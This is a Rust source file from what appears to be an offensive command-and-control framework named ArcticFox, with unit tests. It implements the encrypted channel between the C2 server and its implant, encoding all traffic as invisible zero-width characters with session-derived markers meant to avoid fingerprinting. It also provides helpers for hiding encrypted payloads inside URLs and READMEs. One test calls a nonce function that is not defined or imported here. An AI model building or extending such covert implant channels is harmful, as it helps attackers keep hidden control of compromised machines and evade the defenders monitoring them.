//! ArcticFox ZW Transport — Universal Encrypted Zero-Width Framing Layer
//!
//! Every byte that leaves or enters the C2 passes through this pipeline:
//!
//!   SEND:  plaintext → AEAD encrypt → ZW-encode → frame+delimit → socket
//!   RECV:  socket → scan ZW frames → ZW-decode → AEAD decrypt → plaintext
//!
//! Key properties:
//! - **ZW on both sides**: C2 server and implant both encode ALL traffic
//! - **Encrypt-then-ZW**: ChaCha20-Poly1305 before ZW (hides ciphertext structure)
//! - **Framing**: start/end markers delimit each message
//! - **Nonce chaining**: sequential nonces prevent replay within a session
//! - **Protocol agnostic**: works over TCP, UDP, ICMP — any byte stream

use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tracing::debug;

use arcticfox_core::crypto::{
    aead_decrypt, aead_encrypt, SESSION_KEY_LEN, NONCE_LEN,
};
use arcticfox_core::error::{ArcticFoxError, Result};
use arcticfox_core::zwcodec;
use ring::rand::{SecureRandom, SystemRandom};

// ── Framing Constants ───────────────────────────────────────────────────────

/// Max frame payload bytes (before encode/encrypt overhead).
const MAX_FRAME_PAYLOAD: usize = 64 * 1024; // 64 KiB
/// Frame marker length (16 ZW chars to avoid collision with payload).
const FRAME_MARKER_LEN: usize = 16;

// ── Session ─────────────────────────────────────────────────────────────────

/// A bidirectional ZW-encrypted transport session.
///
/// Holds session key + nonce state for both send and receive directions.
/// Frame markers are derived from the session key to prevent fingerprinting.
/// Each direction has its own nonce counter to prevent replay.
pub struct ZwSession {
    /// Session key for AEAD (ChaCha20-Poly1305).
    session_key: [u8; SESSION_KEY_LEN],
    /// Nonce counter for outgoing messages.
    send_nonce: u64,
    /// Nonce counter for incoming messages (expected).
    recv_nonce: u64,
    /// Session-derived frame start marker.
    frame_start: String,
    /// Session-derived frame end marker.
    frame_end: String,
}

/// Generate deterministic frame markers from a session key.
fn derive_frame_markers(key: &[u8; SESSION_KEY_LEN]) -> (String, String) {
    use rand::Rng;
    use rand::SeedableRng;
    let seed = u64::from_le_bytes(key[..8].try_into().unwrap_or([0; 8]));
    let mut rng: rand::rngs::StdRng = SeedableRng::seed_from_u64(seed);
    let start: String = (0..FRAME_MARKER_LEN)
        .map(|_| zwcodec::ZW_CHARS[rng.gen_range(0..4)])
        .collect();
    let end: String = start.chars().rev().collect();
    (start, end)
}

impl ZwSession {
    /// Create a new session with a pre-shared key.
    /// Initial nonces and frame markers are randomized/derived from key.
    pub fn new(session_key: [u8; SESSION_KEY_LEN]) -> Self {
        let rng = SystemRandom::new();
        let mut nonce_seed = [0u8; 16];
        rng.fill(&mut nonce_seed).ok();
        let send_nonce = u64::from_le_bytes(nonce_seed[..8].try_into().unwrap_or([0; 8]));
        let recv_nonce = u64::from_le_bytes(nonce_seed[8..].try_into().unwrap_or([0; 8]));
        let (frame_start, frame_end) = derive_frame_markers(&session_key);
        ZwSession {
            session_key,
            send_nonce,
            recv_nonce,
            frame_start,
            frame_end,
        }
    }

    /// Create a session with explicit nonces (for testing/synchronization).
    pub fn with_nonces(key: [u8; SESSION_KEY_LEN], send: u64, recv: u64) -> Self {
        let (frame_start, frame_end) = derive_frame_markers(&key);
        ZwSession {
            session_key: key,
            send_nonce: send,
            recv_nonce: recv,
            frame_start,
            frame_end,
        }
    }

    /// Create a session from a shared secret + salt via HKDF.
    pub fn from_shared_secret(secret: &[u8], salt: &[u8], info: &[u8]) -> Self {
        let key = arcticfox_core::crypto::derive_session_key(secret, salt, info);
        Self::new(key)
    }

    /// Generate a fresh random session (ephemeral key exchange).
    /// For loopback (seal+open on same session), nonces are synchronized.
    pub fn ephemeral() -> Self {
        let rng = SystemRandom::new();
        let mut seed = [0u8; 8];
        rng.fill(&mut seed).ok();
        let nonce = u64::from_le_bytes(seed);
        Self::with_nonces(arcticfox_core::crypto::generate_session_key(), nonce, nonce)
    }

    /// Get the raw session key (for sharing out-of-band).
    pub fn key_bytes(&self) -> &[u8; SESSION_KEY_LEN] {
        &self.session_key
    }

    /// Build a 12-byte nonce from a counter (little-endian, zero-padded).
    fn counter_nonce(counter: u64) -> [u8; NONCE_LEN] {
        let mut nonce = [0u8; NONCE_LEN];
        nonce[..8].copy_from_slice(&counter.to_le_bytes());
        nonce
    }

    /// Encrypt then ZW-encode a message for sending.
    ///
    /// Returns the framed, ZW-encoded string ready to write to a socket.
    pub fn seal(&mut self, plaintext: &[u8]) -> Result<String> {
        if plaintext.len() > MAX_FRAME_PAYLOAD {
            return Err(ArcticFoxError::Internal {
                message: format!(
                    "payload too large: {} bytes (max {})",
                    plaintext.len(),
                    MAX_FRAME_PAYLOAD
                ),
            });
        }

        let nonce = Self::counter_nonce(self.send_nonce);
        let ciphertext = aead_encrypt(&self.session_key, &nonce, plaintext)?;
        self.send_nonce = self.send_nonce.wrapping_add(1);

        let zw_encoded = zwcodec::encode(&ciphertext);
        let frame = format!("{}{}{}", self.frame_start, zw_encoded, self.frame_end);

        debug!(
            "seal: {} bytes plain → {} bytes cipher → {} ZW chars → {} frame chars",
            plaintext.len(),
            ciphertext.len(),
            zw_encoded.len(),
            frame.len()
        );

        Ok(frame)
    }

    /// ZW-decode then decrypt a received frame.
    ///
    /// `frame` should be the raw frame including delimiters.
    pub fn open(&mut self, frame: &str) -> Result<Vec<u8>> {
        let inner = extract_frame_body(frame, &self.frame_start, &self.frame_end)?;
        let ciphertext = zwcodec::decode(&inner)?;

        let nonce = Self::counter_nonce(self.recv_nonce);
        let plaintext = aead_decrypt(&self.session_key, &nonce, &ciphertext)?;
        self.recv_nonce = self.recv_nonce.wrapping_add(1);

        debug!(
            "open: {} ZW chars → {} bytes cipher → {} bytes plain",
            inner.len(),
            ciphertext.len(),
            plaintext.len()
        );

        Ok(plaintext)
    }

    /// Send an encrypted+ZW message over an async writer.
    pub async fn send<W: AsyncWrite + Unpin>(&mut self, writer: &mut W, plaintext: &[u8]) -> Result<()> {
        let frame = self.seal(plaintext)?;
        writer.write_all(frame.as_bytes()).await.map_err(|e| {
            ArcticFoxError::Internal {
                message: format!("ZW transport write failed: {e}"),
            }
        })?;
        writer.flush().await.map_err(|e| ArcticFoxError::Internal {
            message: format!("ZW transport flush failed: {e}"),
        })?;
        Ok(())
    }

    /// Receive an encrypted+ZW message from an async reader.
    ///
    /// Scans for frame delimiters, extracts the ZW body, decodes, and decrypts.
    pub async fn recv<R: AsyncRead + Unpin>(&mut self, reader: &mut R) -> Result<Vec<u8>> {
        // Buffer up to 320 KiB of ZW chars (worst case ~4x of 64 KiB payload + tag + framing + margin)
        let mut buf = vec![0u8; 320 * 1024];
        let mut total = 0usize;

        // Read until we accumulate enough data
        loop {
            if total >= buf.len() {
                return Err(ArcticFoxError::Internal {
                    message: "ZW frame buffer overflow".into(),
                });
            }
            let n = reader.read(&mut buf[total..]).await.map_err(|e| {
                ArcticFoxError::Internal {
                    message: format!("ZW transport read failed: {e}"),
                }
            })?;
            if n == 0 {
                return Err(ArcticFoxError::Internal {
                    message: "ZW transport: connection closed".into(),
                });
            }
            total += n;
            let data = String::from_utf8_lossy(&buf[..total]);
            // Try to extract a complete frame
            if let Ok(payload) = self.try_open_frame(&data) {
                return Ok(payload);
            }
            // Otherwise keep reading
        }
    }

    /// Try to extract and decrypt a complete frame from buffered data.
    /// Returns Ok if a full frame was found, Err if incomplete (keep reading).
    fn try_open_frame(&mut self, data: &str) -> Result<Vec<u8>> {
        let inner = extract_frame_body(data, &self.frame_start, &self.frame_end)?;
        let ciphertext = zwcodec::decode(&inner)?;

        let nonce = Self::counter_nonce(self.recv_nonce);
        let plaintext = aead_decrypt(&self.session_key, &nonce, &ciphertext)?;
        self.recv_nonce = self.recv_nonce.wrapping_add(1);

        Ok(plaintext)
    }
}

// ── Frame Parsing ───────────────────────────────────────────────────────────

/// Extract the ZW-encoded body between session-specific frame markers.
fn extract_frame_body(data: &str, frame_start: &str, frame_end: &str) -> Result<String> {
    let start = data.find(frame_start).ok_or_else(|| ArcticFoxError::Internal {
        message: "no ZW frame start marker found".into(),
    })?;
    let body_start = start + frame_start.len();
    let remaining = &data[body_start..];
    let end = remaining.find(frame_end).ok_or_else(|| ArcticFoxError::Internal {
        message: "no ZW frame end marker found (incomplete frame)".into(),
    })?;
    Ok(remaining[..end].to_string())
}

// ── Convenience: All-in-One Encrypted ZW Message ───────────────────────────

/// One-shot: encrypt + ZW-encode a payload (no framing — for embedding in URLs, READMEs, etc.)
pub fn seal_oneshot(key: &[u8; SESSION_KEY_LEN], nonce: &[u8; NONCE_LEN], plaintext: &[u8]) -> Result<String> {
    let ciphertext = aead_encrypt(key, nonce, plaintext)?;
    Ok(zwcodec::encode(&ciphertext))
}

/// One-shot: ZW-decode + decrypt a payload.
pub fn open_oneshot(key: &[u8; SESSION_KEY_LEN], nonce: &[u8; NONCE_LEN], zw_text: &str) -> Result<Vec<u8>> {
    let ciphertext = zwcodec::decode(zw_text)?;
    aead_decrypt(key, nonce, &ciphertext)
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn seal_open_roundtrip() {
        let mut sess = ZwSession::ephemeral();
        let msg = b"Hello, ZW transport world!";
        let frame = sess.seal(msg).unwrap();
        let decoded = sess.open(&frame).unwrap();
        assert_eq!(decoded, msg);
    }

    #[test]
    fn bidirectional_nonces() {
        let key = arcticfox_core::crypto::generate_session_key();
        let mut alice = ZwSession::with_nonces(key, 0, 0);
        let mut bob = ZwSession::with_nonces(key, 0, 0);

        // Alice sends to Bob
        let frame = alice.seal(b"ping").unwrap();
        let decoded = bob.open(&frame).unwrap();
        assert_eq!(decoded, b"ping");

        // Bob sends to Alice
        let frame = bob.seal(b"pong").unwrap();
        let decoded = alice.open(&frame).unwrap();
        assert_eq!(decoded, b"pong");

        // Multi-message sequence
        for i in 0u8..10 {
            let msg = vec![i; 16];
            let frame = alice.seal(&msg).unwrap();
            let decoded = bob.open(&frame).unwrap();
            assert_eq!(decoded, msg);
        }
    }

    #[test]
    fn oneshot_roundtrip() {
        let key = arcticfox_core::crypto::generate_session_key();
        let nonce = generate_nonce();
        let msg = b"oneshot test payload";
        let zw = seal_oneshot(&key, &nonce, msg).unwrap();
        let decoded = open_oneshot(&key, &nonce, &zw).unwrap();
        assert_eq!(decoded, msg);
    }

    #[test]
    fn wrong_key_fails() {
        let mut sess = ZwSession::ephemeral();
        let frame = sess.seal(b"secret").unwrap();

        let mut wrong = ZwSession::ephemeral();
        assert!(wrong.open(&frame).is_err());
    }

    #[test]
    fn nonce_replay_detected() {
        let mut sess = ZwSession::ephemeral();
        let frame = sess.seal(b"msg1").unwrap();
        let _ = sess.open(&frame).unwrap();
        // Replaying the same frame should fail (wrong nonce)
        assert!(sess.open(&frame).is_err());
    }

    #[test]
    fn empty_payload() {
        let mut sess = ZwSession::ephemeral();
        let frame = sess.seal(b"").unwrap();
        let decoded = sess.open(&frame).unwrap();
        assert!(decoded.is_empty());
    }

    #[test]
    fn max_payload() {
        let mut sess = ZwSession::ephemeral();
        let msg = vec![0xAAu8; MAX_FRAME_PAYLOAD];
        let frame = sess.seal(&msg).unwrap();
        let decoded = sess.open(&frame).unwrap();
        assert_eq!(decoded, msg);
    }
}
